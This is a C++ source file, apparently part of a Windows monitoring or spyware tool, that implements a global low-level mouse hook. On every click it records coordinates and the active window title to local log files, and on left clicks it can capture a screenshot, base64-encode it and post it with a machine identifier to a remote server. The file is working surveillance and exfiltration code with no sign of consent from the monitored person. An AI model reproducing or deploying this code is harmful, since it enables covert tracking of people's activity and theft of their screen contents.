#include "MouseHook.h"
#include "Date.h"
#include "Time.h"
#include "Build.h"
#include "WindowsData.h"
#include "Filetxt.h"
#include "Screenshot.h"
#include "httpRequest.h"
#include "ConfigReader.h"
#include "ConfigReader.h"

LRESULT WINAPI MyMouseCallback(int nCode, WPARAM wParam, LPARAM lParam); //callback declaration

//Variable Global
HWND otherWindow = NULL;
char mTitle[1000];
std::string myTitle = "";
std::string mouseC = "";
std::string mouseTitle[3] = {};
int mAux;

int MouseHook::Messsages() {
	while (msg.message != WM_QUIT) { //while we do not close our application
		if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		Sleep(1);
	}
	UninstallHook(); //if we close, let's uninstall our hook
	return (int)msg.wParam; //return the messages
}

void MouseHook::InstallHook() {
	/*
	SetWindowHookEx(
	WM_MOUSE_LL = mouse low level hook type,
	MyMouseCallback = our callback function that will deal with system messages about mouse
	NULL, 0);

	c++ note: we can check the return SetWindowsHookEx like this because:
	If it return NULL, a NULL value is 0 and 0 is false.
	*/
	if (!(hook = SetWindowsHookEx(WH_MOUSE_LL, MyMouseCallback, NULL, 0))) {
		printf_s("Error: %x \n", GetLastError());
	}
}

void MouseHook::UninstallHook() {
	/*
	uninstall our hook using the hook handle
	*/
	UnhookWindowsHookEx(hook);
}

LRESULT WINAPI MyMouseCallback(int nCode, WPARAM wParam, LPARAM lParam) {
	MSLLHOOKSTRUCT* pMouseStruct = (MSLLHOOKSTRUCT*)lParam;

	Date date = Date();
	Time time = Time();
	WindowsData data = WindowsData();
	Build directory = Build(data.getUserNamer());

	std::stringstream temp;

	if (nCode == HC_ACTION) {
		//std::cout << "Ingresando al hook" << std::endl;
		if (wParam == WM_LBUTTONDOWN || wParam == WM_LBUTTONUP || wParam == WM_RBUTTONDOWN || wParam == WM_RBUTTONUP) {
			std::cout << "hook" << std::endl;
			
				if (pMouseStruct != NULL) { // Mouse struct contain information?			
					printf_s("Mouse Coordinates: x = %i | y = %i \n", pMouseStruct->pt.x, pMouseStruct->pt.y);
				}

				HWND currentWindow = GetForegroundWindow();

				if (currentWindow != otherWindow) {

					GetWindowTextA(GetForegroundWindow(), mTitle, _countof(mTitle));
					myTitle = mTitle;

					myTitle.erase(remove(myTitle.begin(), myTitle.end(), 'á'), myTitle.end());
					myTitle.erase(remove(myTitle.begin(), myTitle.end(), 'é'), myTitle.end());
					myTitle.erase(remove(myTitle.begin(), myTitle.end(), 'í'), myTitle.end());
					myTitle.erase(remove(myTitle.begin(), myTitle.end(), 'ó'), myTitle.end());
					myTitle.erase(remove(myTitle.begin(), myTitle.end(), 'ú'), myTitle.end());
					myTitle.erase(remove(myTitle.begin(), myTitle.end(), 'ñ'), myTitle.end());
					myTitle.erase(remove(myTitle.begin(), myTitle.end(), '?'), myTitle.end());
					myTitle.erase(remove(myTitle.begin(), myTitle.end(), ':'), myTitle.end());

					if (myTitle.find("\\") != -1) {
						std::string delimiter = "\\";
						size_t pos = 0;
						std::string token;
						while ((pos = myTitle.find(delimiter)) != std::string::npos) {
							token = myTitle.substr(0, pos);
							myTitle.erase(0, pos + delimiter.length());
						}
					}
					std::cout << "[-] " << myTitle << std::endl;
					temp << " - Current Window: " << myTitle << "\n\n";
					//outPut.append(temp.str());
					std::cout << temp.str() << std::endl;

					// Setup for next CallBack
					otherWindow = currentWindow;
				}


				switch (wParam) {

				case WM_LBUTTONUP: {
					double xPos = pMouseStruct->pt.x;
					double yPos = pMouseStruct->pt.y;
					mouseC += "[+] Ventana = " + myTitle + "\n";
					mouseC += "[+] Click Izquierdo levantado: \t [-] x = " + std::to_string(xPos) + " | y = " + std::to_string(yPos) + "\n";
					break;
				}
				case WM_LBUTTONDOWN: {
					double xPos = pMouseStruct->pt.x;
					double yPos = pMouseStruct->pt.y;
					ConfigReader myConfig = ConfigReader(directory.getPath());
					if (myConfig.getValue("Screen_Click").compare("on") == 0) {
						Screenshot screen = Screenshot(directory.getPathImage());
						std::string image = date.getNumbers() + "-" + time.getNumbers() + "- CLICK -" + myTitle;
						screen.saveJpeg(image);
						std::string content = "data:image/jpeg;base64,";
						httpRequest post = httpRequest();
						if (screen.getBase64(image).compare("empty") != 0) {
							content += screen.getBase64(image);
							post.RequestRecord(myTitle, myTitle, date.getNow(), time.getNow(), "screenshot", content, data.getID());
						}
					}
					mouseC += "[+] Ventana = " + myTitle + "\n";
					mouseC += "[+] Click Izquierdo presionado: \n \t [-] x = " + std::to_string(xPos) + " | y = " + std::to_string(yPos) + "\n";
					break;
				}
				case WM_RBUTTONUP: {
					double xPos = pMouseStruct->pt.x;
					double yPos = pMouseStruct->pt.y;
					mouseC += "[+] Ventana = " + myTitle + "\n";
					mouseC += "[+] Click Derecho levantado: \n \t [-] x = " + std::to_string(xPos) + " | y = " + std::to_string(yPos) + "\n";
					break;
				}
				case WM_RBUTTONDOWN: {
					double xPos = pMouseStruct->pt.x;
					double yPos = pMouseStruct->pt.y;
					mouseC += "[+] Ventana = " + myTitle + "\n";
					mouseC += "[+] Click Derecho presionado: \n \t [-] x = " + std::to_string(xPos) + " | y = " + std::to_string(yPos) + "\n";
					break;
				}
				default:break;

				}
				std::cout << mouseC << std::endl;

				date.setDateInt();
				time.setTimeInt();
				Filetxt file = Filetxt(directory.getPathKeyboard(), directory.getPathMouse());

				file.saveFile(
					"mouse",
					date.getNumbers() +" - MOUSE",
					date.getNow(),
					time.getNow(),
					myTitle,
					mouseC
				);
			}
		
	}
	return CallNextHookEx(MouseHook::Instance().hook, nCode, wParam, lParam);
}